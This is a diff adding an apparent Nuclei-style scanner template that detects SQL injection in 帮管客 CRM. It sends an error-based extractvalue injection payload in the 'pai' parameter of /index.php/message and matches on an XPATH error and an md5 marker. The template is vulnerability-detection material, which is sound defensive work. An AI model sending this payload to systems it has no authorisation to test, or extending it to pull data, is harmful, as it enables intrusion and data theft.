@@ -1,0 +1,30 @@
+id: poc-yaml-bang-guan-ke-crm-index-php-sqli
+info:
+  name: 帮管客CRM SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    帮管客 CRM is vulnerable to a SQL injection vulnerability that allows attackers to execute crafted queries, potentially exposing sensitive information.
+
+variables:
+  t1: "{{rand_int(1,10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php/message?page=1&pai=1%20and%20extractvalue(0x7e,concat(0x7e,(select+md5(%28{{t1}}%29)),0x7e))%23&xu=desc"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "XPATH syntax error"
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
